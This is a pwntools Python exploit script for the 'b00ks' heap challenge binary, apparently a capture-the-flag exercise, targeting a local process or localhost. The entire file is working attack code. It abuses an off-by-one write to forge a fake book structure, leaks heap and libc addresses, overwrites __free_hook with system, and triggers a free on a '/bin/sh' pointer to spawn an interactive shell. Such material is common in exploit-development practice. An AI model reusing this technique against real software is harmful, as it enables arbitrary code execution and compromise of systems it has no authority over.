from pwn import *
context(log_level='debug',os='linux',arch='amd64')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#context.terminal = ['tmux','splitw','-h'] #docker
#gdb.attach(proc.pidof(p)[0],gdbscript="b *0x4008cb")
DEBUG = 0 # debug model 1 for debug
LOCAL = 1 # control local or process

if LOCAL:
    io = process('./b00ks')
else:
    io = remote('127.0.0.1', 5678)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# used for debug
image_base = 0x555555554000
bp = image_base + 0x202040
if DEBUG:
    pwnlib.gdb.attach(io)

rv = io.recv
ru = io.recvuntil
rl = io.readline
sd = io.send
sa = io.sendafter
sl = io.sendline
sla = io.sendlineafter

def mypack(input):
    return p64(input).decode("iso-8859-1")

def myunpack(input):
    return u64(input.ljust(8,bytes('0','iso-8859-1')))

def create_book(name_size, name, description_size, description):
    sla(">", "1")
    sla("Enter book name size:", str(name_size))
    sla("Enter book name (Max 32 chars):", name)
    sla("Enter book description size: ", str(description_size))
    sla("Enter book description: ", str(description))
    log.info("Create")

def delete_book(idx):
    sla(">", "2")
    sla("Enter the book id you want to delete: ", str(idx))
    log.info("Delete")

def edit_book(idx, description):
    sla(">", "3")
    sla("Enter the book id you want to edit: ", str(idx))
    ru("Enter new book description")
    sla(": ", description)
    log.info("Edit")

def print_book(idx):
    sla(">", "4")
    for i in range(idx):
        ru(": ")
        book_id = int(rl()[:-1])
        ru(": ")
        book_name = rl()[:-1]
        ru(": ")
        book_des = rl()[:-1]
        ru(": ")
        book_author = rl()[:-1]
    log.info("print_book")
    return book_id, book_name, book_des, book_author

def change_name(name):
    sla(">", "5")
    sla("Enter author name: ", name)
    log.info("change name")

def create_name(name):
    sla("name:", name)



create_name("A" * 32)
create_book(0x20, "a", 0x80, "b") 
create_book(0x21000, "c", 0x21000, "d") # mmap malloc
# leak book1_addr
book_id, book_name, book_des, book_author = print_book(1) # print book1_addr 
ru("A"*32)
book1_addr = u64(book_author[32:32+6].ljust(8, b"\x00"))
log.info("book1_addr: " + hex(book1_addr))



book2_addr = book1_addr + 0x30 # we can know from malloc(book) 0x20+0x10(chunkhead)
# fake book_struct in book1_description
# 0x60 =hex(0x300-0x2a0) 0x300 is after off-by-one
# offset +fake_book_id +fake_book_name(book2_addr+8=book2_name_ptr)
payload = 'a' * 0x60 + mypack(1) + mypack(book2_addr + 8) *2 + mypack(0xffff)
edit_book(1, payload) # write into book1_description 
sleep(1)

### leak book2_name_ptr

change_name('A'*32)
# leak book2_name ptr
book_id, book_name, book_des, book_author = print_book(1)

book2_name_addr = u64(book_des.ljust(8, b"\x00"))
log.info("book2_name_addr: " + hex(book2_name_addr))

# libcbase debug:offset = name_ptr - libc
offset =   0x7ffff7fb9010- 0x7ffff79e2000
libcbase = book2_name_addr - offset
log.info("libcbase: " + hex(libcbase))

### reference
free_hook = libc.symbols['__free_hook'] + libcbase
system = libc.symbols['system'] + libcbase

binsh_addr = libc.search(b'/bin/sh').__next__() + libcbase

payload = mypack(binsh_addr) + mypack(free_hook)
edit_book(1, payload)

payload = mypack(system)
edit_book(2, payload)

delete_book(2)
io.interactive()